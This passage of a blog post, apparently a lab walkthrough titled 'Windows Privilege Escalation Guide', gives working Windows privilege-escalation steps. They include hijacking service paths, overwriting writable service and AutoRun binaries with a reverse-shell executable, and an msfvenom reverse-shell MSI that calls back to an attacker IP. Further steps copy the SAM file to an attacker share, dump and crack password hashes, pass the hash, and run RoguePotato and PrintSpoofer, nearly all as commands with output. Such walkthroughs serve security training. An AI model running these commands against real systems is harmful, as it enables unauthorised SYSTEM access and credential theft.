+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;reg add HKLM<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\s</span>ervices<span class="se">\r</span>egsvc /v ImagePath /t REG_EXPAND_SZ /d C:<span class="se">\P</span>rivEsc<span class="se">\r</span>everse.exe /f
+The operation completed successfully.
+</code></pre></td></tr></table>
+</div>
+</div><p>Where:
+<code>/v:  The value name, under the selected Key, to add.</code>
+<code>/t: RegKey data types [ REG_SZ    | REG_MULTI_SZ | REG_EXPAND_SZ | REG_DWORD | REG_QWORD    | REG_BINARY    | REG_NONE ] If omitted, REG_SZ is assumed.</code>
+<code>/d:  The data to assign to the registry ValueName being added.</code>
+<code>/f: Force overwriting the existing registry entry without prompt.</code>
+Hence by starting <code>regsvc</code> we get the reverse shell conection in linux same as above.</p>
+<h3 id="insecure-service-executables">Insecure Service Executables</h3>
+<p>Here we will be exploiting <code>filepermsvc</code> service which can be done same as other service i.e. by changing the <code>bin_path</code> directory with the directory of our <code>reverse.exe</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;sc qc filepermsvc
+</code></pre></td></tr></table>
+</div>
+</div><p>Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173<span class="se">\a</span>ccesschk.exe /accepteula -quvw <span class="s2">&#34;C:\Program Files\File Permissions Service\filepermservice.exe&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Copy the reverse.exe executable you created and replace the filepermservice.exe with it:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;copy C:<span class="se">\g</span>r4n173<span class="se">\r</span>everse.exe <span class="s2">&#34;C:\Program Files\File Permissions Service\filepermservice.exe&#34;</span> /Y
+</code></pre></td></tr></table>
+</div>
+</div><p>Start a listener on linux and then start the service to spawn a reverse shell running with SYSTEM privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;net start filepermsvc
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="3-registry">3. Registry</h2>
+<h3 id="autoruns">AutoRuns</h3>
+<p>Query the registry for AutoRun executables:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\C</span>urrentVersion<span class="se">\R</span>un
+</code></pre></td></tr></table>
+</div>
+</div><p>Using accesschk.exe, note that one of the AutoRun executables is writable by everyone:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173<span class="se">\a</span>ccesschk.exe /accepteula -wvu <span class="s2">&#34;C:\Program Files\Autorun Program\program.exe&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Copy the reverse.exe executable you created and overwrite the AutoRun executable with it:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;copy C:<span class="se">\g</span>r4n173<span class="se">\r</span>everse.exe <span class="s2">&#34;C:\Program Files\Autorun Program\program.exe&#34;</span> /Y
+</code></pre></td></tr></table>
+</div>
+</div><p>Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves!</p>
+<p><code>rdesktop 10.10.107.23</code></p>
+<h3 id="alwaysinstallelevated">AlwaysInstallElevated</h3>
+<p>When <code>AlwaysInstallElevated</code> is set for both <code>HKLM(HKEY\_LOCAL\_MACHINE)</code> and <code>HKCU(_HKEY\_CURRENT\_USER_)</code> in registry for every install program then, program automatically obtains system privileges. And another thing i.e. Windows environment provide a group policy settings which allows a regular user to install a Microsoft Windows Installer Package(MSI) with system privileges.
+So from that prospective, here we have to set the both <code>HKLM</code>and <code>HKCU</code> then we can get the system. For that we have to <code>query</code> registry first.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;reg query HKCU<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated
+
+HKEY_CURRENT_USER<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller
+    AlwaysInstallElevated    REG_DWORD    0x1
+C:<span class="se">\g</span>r4n173&gt;reg query HKLM<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller /v AlwaysInstallElevated
+
+HKEY_LOCAL_MACHINE<span class="se">\S</span>OFTWARE<span class="se">\P</span>olicies<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\I</span>nstaller
+    AlwaysInstallElevated    REG_DWORD    0x1
+</code></pre></td></tr></table>
+</div>
+</div><p>Here both are set. Now our task is to install reverseshell as <code>msi</code> package for that we can use <code>msfvenom</code> and then transfer it to windows machine using <code>smb</code> server.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@g4n173:~$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.2.77.175 <span class="nv">LPORT</span><span class="o">=</span><span class="m">53</span> -f msi -o reverse.msi
+<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: <span class="m">460</span> bytes
+Final size of msi file: <span class="m">159744</span> bytes
+Saved as: reverse.msi
+</code></pre></td></tr></table>
+</div>
+</div><p>Now, it has been transfered to windows and if we try to run it with a listner on in kali then we get the shell with <code>SYSTEM privileges</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;msiexec /quite /qn /i reverse.msi
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="4-passwords">4. Passwords</h2>
+<h3 id="registry">Registry</h3>
+<p>We can search for the keys and values that contains word &lsquo;password&rsquo; in registry using</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;reg query HKLM /f password /t REG_SZ	/s
+C:<span class="se">\g</span>r4n173&gt;reg query HKCU /f password /t REG_SZ /s
+.......
+HKEY_LOCAL_MACHINE<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\T</span>erminal Server<span class="se">\D</span>efaultUserConfiguration
+    Password    REG_SZ
+HKEY_LOCAL_MACHINE<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\T</span>erminal Server<span class="se">\W</span>inStations<span class="se">\R</span>DP-Tcp
+    Password    REG_SZ
+HKEY_LOCAL_MACHINE<span class="se">\S</span>YSTEM<span class="se">\C</span>urrentControlSet<span class="se">\S</span>ervices<span class="se">\R</span>emoteAccess<span class="se">\P</span>olicy<span class="se">\P</span>ipeline<span class="se">\2</span><span class="m">3</span>
+    <span class="o">(</span>Default<span class="o">)</span>    REG_SZ    IAS.ChangePassword
+End of search: <span class="m">258</span> match<span class="o">(</span>es<span class="o">)</span> found.
+</code></pre></td></tr></table>
+</div>
+</div><p>To query for windows autologin which will display password and username</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;reg query <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span> /v DefaultUsername
+C:<span class="se">\g</span>r4n173&gt;reg query <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span> /v DefaultPassword
+</code></pre></td></tr></table>
+</div>
+</div><p>Now if we got the creds of <code>admin</code> then we can login using <code>winexe</code> in kali machine which is same as <code>ssh</code> in linux with creds.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ winexe -U <span class="s1">&#39;admin%password&#39;</span> //10.10.26.193 cmd.exe
+c<span class="o">)</span> <span class="m">2018</span> Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+whoami
+win-qba94kb3iof<span class="se">\a</span>dmin
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="saved-creds">Saved Creds</h3>
+<p>If we got the saved creds in <code>windows</code> machine then we can get the reverse connection using <code>savedcred</code>
+To search for saved credentials</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;cmdkey /list
+Currently stored credentials:
+
+    Target: WindowsLive:target<span class="o">=</span>virtualapp/didlogical
+    Type: Generic
+    User: 02nfpgrklkitqatu
+    Local machine persistence
+
+    Target: Domain:interactive<span class="o">=</span>WIN-QBA94KB3IOF<span class="se">\a</span>dmin
+    Type: Domain Password
+    User: WIN-QBA94KB3IOF<span class="se">\a</span>dmin
+</code></pre></td></tr></table>
+</div>
+</div><p>This indicate <code>admin</code> users creds is saved. Now to get the reverse connection we can <code>runas</code> with listner on in linux.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;runas /savecred /user:admin C:<span class="se">\P</span>rivEsc<span class="se">\r</span>everse.exe
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><strong>Note:</strong> If you want to create the saved credential list in windows then we can use the following command.
+<code>C:\gr4n173&gt; cmdkey /add:vulnerabl-pc /user:gr4n173 /pass:password</code>
+<strong>For more info:</strong> visit here <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey" target="_blank" rel="noopener noreffer">cmdkey</a>.</p>
+</blockquote>
+<h3 id="security-account-manager-sam">Security Account Manager (SAM)</h3>
+<p>Basically Windows user password hashes can be extracted using <code>SAM</code> and <code>SYSTEM</code> files.</p>
+<blockquote>
+<p>In order to transfer files from <code>windows</code> machine to <code>linux</code> we can use same <code>smb</code> server and use <code>copy</code> command as
+C:\gr4n173&gt;copy FILENAME \IP_address_of_linux\gr4n173\</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;copy SAM <span class="se">\\</span>10.2.77.175<span class="se">\g</span>r4n173
+</code></pre></td></tr></table>
+</div>
+</div><p>Now to after transfer of files into linux machine we can download <code>creddump7</code> to dump out the hashes. You can download <a href="https://github.com/Tib3rius/creddump7" target="_blank" rel="noopener noreffer">creddump7</a>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ python3 creddump7/pwdump.py SYSTEM SAM
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:hashes over here:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
+user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
+admin:1001:aad3b435b51404eeaad3b435b51404ee:hashes overhere:::
+</code></pre></td></tr></table>
+</div>
+</div><p>Then after getting hashes we can crack the password using <code>hashcat</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ hashcat -m <span class="m">1000</span> --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlist/rockyou.txt
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="passing-the-hash">Passing the Hash</h3>
+<p>Kali Linux have a tool which allow to login using the username/passwordhash called <code>pth-winexe</code> and spawn a shell running as <code>admin</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ pth-winexe -U <span class="s1">&#39;admin%hash_over_here&#39;</span> //10.10.26.193 cmd.exe
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="5-scheduled-tasks">5. Scheduled Tasks</h2>
+<p>As in linux we use <code>cronjob</code> for scheduled tasks but here in <code>Windows</code> we can use <code>cleanup.ps1</code> script. This tools usually cleanup but only thing is it need to be run by <code>SYSTEM</code>. Download <a href="https://github.com/kentgrav/PowerShell/blob/master/Windows-Cleanup.ps1" target="_blank" rel="noopener noreffer">here</a>.
+To <code>cat</code> the file in <code>windows</code> we can use <code>type</code> command and can see it is run by <code>SYSTEM</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\D</span>evTools&gt;type CleanUp.ps1
+<span class="c1"># This script will clean up all your old dev logs every minute.</span>
+<span class="c1"># To avoid permissions issues, run as SYSTEM (should probably fix this later)</span>
+
+Remove-Item C:<span class="se">\D</span>evTools<span class="se">\*</span>.log
+</code></pre></td></tr></table>
+</div>
+</div><p>Now our task is to replace <code>cleanup.ps1</code> script with <code>reverse.exe</code>. Then after certain time we can get the shell with listner on in linux.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt; <span class="nb">echo</span> C:<span class="se">\g</span>r4n173<span class="se">\r</span>everse.exe &gt;&gt; C:<span class="se">\g</span>r4n173<span class="se">\C</span>leanUp.ps1
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="6-startup-apps">6. Startup Apps</h2>
+<p>Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt; accesschk.exe /accepteula -d <span class="s2">&#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;cscript CreateShortcut.vbs
+</code></pre></td></tr></table>
+</div>
+</div><p>Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ rdesktop -u admin 10.10.8.98
+</code></pre></td></tr></table>
+</div>
+</div><p>A shell running as admin should connect back to your listener.</p>
+<h2 id="7token-impersonation">7.Token Impersonation</h2>
+<h3 id="rogue-potato">Rogue Potato</h3>
+<p>Here we abused <code>SeImpersonate</code> or <code>SeAssignPrimaryToken</code> privileges to get execution as SYSTEM using <code>roguePotato</code> exploit.
+When we require more than 2 shell of windows in different port then we can use <code>RoguePotato</code> exploit.</p>
+<p>At first we have to port forward in kali which can be done using <code>socat</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">root@gr4n173:~$ sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.8.98:9999
+</code></pre></td></tr></table>
+</div>
+</div><p><code>PsExec.exe</code>helps to execute the process remotely. Now in order to run <code>PSExec.exe</code>we require <code>administrator</code> privilege. So we can click on run-&gt;as administrator while opening cmd. Then only we can run the below command.
+Using <code>PSExec64.exe</code> to trigger the reverse.exe executable with the permissions of the &ldquo;local service&rdquo; account:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;C:<span class="se">\P</span>rivEsc<span class="se">\P</span>SExec64.exe -i -u <span class="s2">&#34;nt authority\local service&#34;</span> C:<span class="se">\P</span>rivEsc<span class="se">\r</span>everse.exe
+</code></pre></td></tr></table>
+</div>
+</div><p>Now again starting new listner on kali.</p>
+<p>Then, in the &ldquo;local service&rdquo; reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt; C:<span class="se">\g</span>r4n173<span class="se">\R</span>oguePotato.exe -r 10.10.10.10 -e <span class="s2">&#34;C:\gr4n173\reverse.exe&#34;</span> -l <span class="m">9999</span>
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><strong>For more info:</strong> <a href="https://0xdf.gitlab.io/2020/09/08/roguepotato-on-remote.html" target="_blank" rel="noopener noreffer">0xdf blog</a></p>
+</blockquote>
+<h3 id="printspoofer">PrintSpoofer</h3>
+<p>Here we use <code>PrintSpoofer</code> exploit to trigger a second shell as same in <code>RoguePotato</code> exploit.</p>
+<ol>
+<li>Setting permissions of the &ldquo;local serivce&rdquo; account same as in above.</li>
+<li>Now running the <code>PrintSpoofer</code> exploit as</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">C:<span class="se">\g</span>r4n173&gt;C:<span class="se">\g</span>r4n173<span class="se">\P</span>rintSpoofer.exe -c <span class="s2">&#34;C:\gr4n173\reverse.exe&#34;</span> -i
+</code></pre></td></tr></table>
+</div>
+</div><p>This way we get the reverse shell with SYSTEM privileges.</p>
+<blockquote>
+<p><strong>Resources:</strong> Several tools have been written which help find potential privilege escalations on Windows. Among of them are writeen below.</p>
+<ol>
+<li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/README.md" target="_blank" rel="noopener noreffer">winPEASany.exe</a></li>
+<li><a href="https://github.com/GhostPack/Seatbelt" target="_blank" rel="noopener noreffer">Seatbelt.exe</a></li>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener noreffer">PowerUp.ps1</a></li>
+<li><a href="https://github.com/GhostPack/SharpUp" target="_blank" rel="noopener noreffer">SharpUp.exe</a>.
+<strong>For more Windows Escalation Technique:</strong></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" target="_blank" rel="noopener noreffer">payloadsallthings</a></li>
+<li><a href="https://guif.re/windowseop" target="_blank" rel="noopener noreffer">guif.re</a>.</li>
+<li><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener noreffer">Script_and_payloads_by_Nishang</a></li>
+</ol>
+</blockquote></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-05-04</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/windowsprivsec/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.com/windowsprivsec/" data-title="Windows Privilege Escalation Guide" data-via="gr4n173" data-hashtags="windows,privilege Escalation"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.com/windowsprivsec/" data-hashtag="windows"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.com/windowsprivsec/" data-title="Windows Privilege Escalation Guide"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.com/windowsprivsec/" data-title="Windows Privilege Escalation Guide"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.com/windowsprivsec/" data-title="Windows Privilege Escalation Guide"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/windows/">windows</a>,&nbsp;<a href="/tags/privilege-escalation/">privilege Escalation</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/linuxprivsec/" class="prev" rel="prev" title="Linux Privilege Escalation Guide"><i class="fas fa-angle-left fa-fw"></i>Linux Privilege Escalation Guide</a></div>
+</div>
+<div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
+            </noscript><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Lots of Love</div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">xxxx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">gr4n173</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><script type="text/javascript" src="https://dpak-creator.disqus.com/embed.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"valine":{"appId":"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI","appKey":"WBmoGyJtbqUswvfLh6L8iEBr","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocl